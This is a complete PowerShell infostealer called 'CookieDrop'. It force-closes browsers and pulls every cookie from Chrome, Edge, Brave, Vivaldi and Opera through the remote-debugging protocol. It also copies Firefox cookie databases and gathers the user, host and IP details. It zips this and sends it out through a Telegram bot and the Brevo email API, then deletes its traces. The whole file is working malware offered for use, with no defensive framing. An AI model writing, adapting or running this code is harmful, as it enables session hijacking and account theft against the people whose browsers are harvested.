#requires -version 5
# CookieDrop - harvest cookies and push them off-box. No dependencies, no admin.
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.IO.Compression.FileSystem

$Here   = Split-Path -Parent $MyInvocation.MyCommand.Path
$ConfF  = Join-Path $Here "config.json"
$Work   = Join-Path $env:TEMP ("cd_" + [guid]::NewGuid().ToString("N").Substring(0, 8))
$Local  = Join-Path $env:LOCALAPPDATA "CookieDrop"
$Stamp  = Get-Date -Format "yyyyMMdd_HHmmss"
New-Item -ItemType Directory -Force $Work  | Out-Null
New-Item -ItemType Directory -Force $Local | Out-Null

if (-not (Test-Path $ConfF)) { exit 1 }
$Conf = Get-Content $ConfF -Raw | ConvertFrom-Json

$Browsers = @{
    chrome  = @{ Exe = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe";             Udd = "$env:LOCALAPPDATA\Google\Chrome\User Data";              Proc = "chrome.exe" }
    edge    = @{ Exe = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe";     Udd = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";             Proc = "msedge.exe" }
    brave   = @{ Exe = "$env:ProgramFiles\BraveSoftware\Brave-Browser\Application\brave.exe"; Udd = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Proc = "brave.exe" }
    vivaldi = @{ Exe = "$env:LOCALAPPDATA\Vivaldi\Application\vivaldi.exe";                  Udd = "$env:LOCALAPPDATA\Vivaldi\User Data";                    Proc = "vivaldi.exe" }
    opera   = @{ Exe = "$env:LOCALAPPDATA\Programs\Opera\opera.exe";                         Udd = "$env:APPDATA\Opera Software\Opera Stable";               Proc = "opera.exe" }
}

function Get-Profiles([string]$Udd) {
    if (-not (Test-Path $Udd)) { return @() }
    $p = @(Get-ChildItem $Udd -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" } | ForEach-Object { $_.Name })
    if ($p.Count -eq 0) { return @("") }
    return $p
}

function Get-CdpCookies([string]$Exe, [string]$Udd, [string]$Profile, [int]$Port) {
    $argStr = "--remote-debugging-port=$Port --user-data-dir=`"$Udd`" --no-first-run --no-default-browser-check --disable-sync"
    if ($Profile) { $argStr += " --profile-directory=`"$Profile`"" }

    $proc = Start-Process -FilePath $Exe -ArgumentList $argStr -PassThru
    $ws = $null
    try {
        try {
            $ver = $null
            for ($i = 0; $i -lt 40; $i++) {
                try {
                    $ver = Invoke-RestMethod "http://127.0.0.1:$Port/json/version" -TimeoutSec 1
                    if ($ver.webSocketDebuggerUrl) { break }
                } catch { }
                Start-Sleep -Milliseconds 400
            }
            if (-not $ver.webSocketDebuggerUrl) { return @() }

            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $ct = [System.Threading.CancellationToken]::None
            $ws.ConnectAsync([Uri]$ver.webSocketDebuggerUrl, $ct).Wait(15000)

            function Send-Json($obj) {
                $b = [Text.Encoding]::UTF8.GetBytes(($obj | ConvertTo-Json -Compress))
                $seg = New-Object "System.ArraySegment[byte]" -ArgumentList @(,$b)
                $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait(10000)
            }
            Send-Json @{ id = 1; method = "Network.enable" }
            Send-Json @{ id = 2; method = "Network.getAllCookies" }

            $buf = New-Object byte[] 262144
            $deadline = (Get-Date).AddSeconds(25)
            while ((Get-Date) -lt $deadline) {
                $ms = New-Object IO.MemoryStream
                do {
                    $r = $ws.ReceiveAsync((New-Object "System.ArraySegment[byte]" -ArgumentList @(,$buf)), $ct).Result
                    if ($r.Count -gt 0) { $ms.Write($buf, 0, $r.Count) }
                } while (-not $r.EndOfMessage)
                $text = [Text.Encoding]::UTF8.GetString($ms.ToArray())
                if ($text -match '"id"\s*:\s*2') {
                    $obj = $text | ConvertFrom-Json
                    return @($obj.result.cookies | ForEach-Object {
                        [pscustomobject]@{
                            host = $env:COMPUTERNAME; domain = $_.domain; name = $_.name
                            value = $_.value; path = $_.path; secure = $_.secure; expires = $_.expires
                        }
                    })
                }
            }
            return @()
        } catch { return @() }
    } finally {
        if ($ws) { try { $ws.Dispose() } catch { } }
        if ($proc) { & taskkill /f /t /pid $proc.Id 2>$null | Out-Null }
    }
}

$findings = @{}
$notes = @()

if ($Conf.close_browsers) {
    $procs = @($Browsers.Keys | ForEach-Object { $Browsers[$_].Proc }) + @("firefox.exe")
    foreach ($p in $procs) {
        if (Get-Process -Name ($p -replace '\.exe$','') -ErrorAction SilentlyContinue) {
            & taskkill /f /im $p 2>$null | Out-Null
        }
    }
    Start-Sleep -Seconds 2
}

foreach ($name in @($Conf.browsers)) {
    $b = $Browsers[$name]
    if ($b -and (Test-Path $b.Exe) -and (Test-Path $b.Udd)) {
        $rows = @()
        foreach ($prof in (Get-Profiles $b.Udd)) {
            try { $rows += Get-CdpCookies $b.Exe $b.Udd $prof $Conf.debug_port } catch { }
        }
        if ($rows.Count) { $findings[$name] = $rows } else { $notes += "$name`: no cookies returned" }
    }
}

$ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
if ($Conf.browsers -contains "firefox" -and (Test-Path $ffRoot)) {
    $ffDir = Join-Path $Work "firefox"
    New-Item -ItemType Directory -Force $ffDir | Out-Null
    foreach ($p in (Get-ChildItem $ffRoot -Directory)) {
        foreach ($f in @("cookies.sqlite","cookies.sqlite-wal")) {
            $src = Join-Path $p.FullName $f
            if (Test-Path $src) { Copy-Item $src (Join-Path $ffDir "$($p.Name)_$f") -Force }
        }
    }
    if (Get-ChildItem $ffDir -File) { $notes += "firefox: raw sqlite included" }
}

$publicIp = ""
try { $publicIp = (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 8) } catch { }
$localIp = @((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" }).IPAddress) -join ","

$meta = [pscustomobject]@{
    host = $env:COMPUTERNAME; user = $env:USERNAME; domain = $env:USERDOMAIN
    os = (Get-CimInstance Win32_OperatingSystem).Caption
    public_ip = $publicIp; local_ip = $localIp; time = (Get-Date).ToString("o")
    counts = ($findings.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value.Count)" }) -join " "
    notes = $notes -join "; "
}

$payload = [pscustomobject]@{ meta = $meta; cookies = $findings }
$json = $payload | ConvertTo-Json -Depth 6
[IO.File]::WriteAllText((Join-Path $Work "cookies.json"), $json, (New-Object System.Text.UTF8Encoding($false)))

$zipPath = Join-Path $Work "cookiedrop_$($env:COMPUTERNAME)_$Stamp.zip"
Compress-Archive -Path (Join-Path $Work "*") -DestinationPath $zipPath -Force
Copy-Item $zipPath $Local -Force

function Send-Telegram([string]$Zip) {
    if (-not $Conf.telegram.token -or -not $Conf.telegram.chat_id) { return $false }
    try {
        $http = New-Object System.Net.Http.HttpClient
        $http.Timeout = [TimeSpan]::FromSeconds(90)
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add((New-Object System.Net.Http.StringContent $Conf.telegram.chat_id), "chat_id")
        $form.Add((New-Object System.Net.Http.StringContent "CookieDrop $($meta.host) - $($meta.counts)"), "caption")
        $bytes = [IO.File]::ReadAllBytes($Zip)
        $fc = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$bytes)
        $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $form.Add($fc, "document", (Split-Path $Zip -Leaf))
        $url = "https://api.telegram.org/bot$($Conf.telegram.token)/sendDocument"
        $resp = $http.PostAsync($url, $form).Result
        return $resp.IsSuccessStatusCode
    } catch { return $false }
}

function Send-Email([string]$Zip) {
    if (-not $Conf.email.enabled -or -not $Conf.email.api_key) { return $false }
    try {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Zip))
        $body = @{
            sender      = @{ email = $Conf.email.from }
            to          = @(@{ email = $Conf.email.to })
            subject     = "CookieDrop $($meta.host) - $($meta.counts)"
            textContent = ($meta | ConvertTo-Json -Depth 4)
            attachment  = @(@{ content = $b64; name = (Split-Path $Zip -Leaf) })
        } | ConvertTo-Json -Depth 6 -Compress
        $h = @{ "api-key" = $Conf.email.api_key; "accept" = "application/json" }
        $r = Invoke-RestMethod "https://api.brevo.com/v3/smtp/email" -Method Post -Headers $h `
             -ContentType "application/json" -Body $body -TimeoutSec 90
        return $true
    } catch { return $false }
}

$wantTg   = [bool]($Conf.telegram.token -and $Conf.telegram.chat_id)
$wantMail = [bool]($Conf.email.enabled -and $Conf.email.api_key)
$tgDone = $false; $mailDone = $false

for ($try = 1; $try -le 3; $try++) {
    if ($wantTg   -and -not $tgDone)   { $tgDone   = Send-Telegram $zipPath }
    if ($wantMail -and -not $mailDone) { $mailDone = Send-Email $zipPath }
    if ((-not $wantTg -or $tgDone) -and (-not $wantMail -or $mailDone)) { break }
    Start-Sleep -Seconds (5 * $try)
}

$sent = ($tgDone -or $mailDone)
if (-not $Conf.keep_local_copy -and $sent) { Remove-Item $zipPath -Force }
Remove-Item $Work -Recurse -Force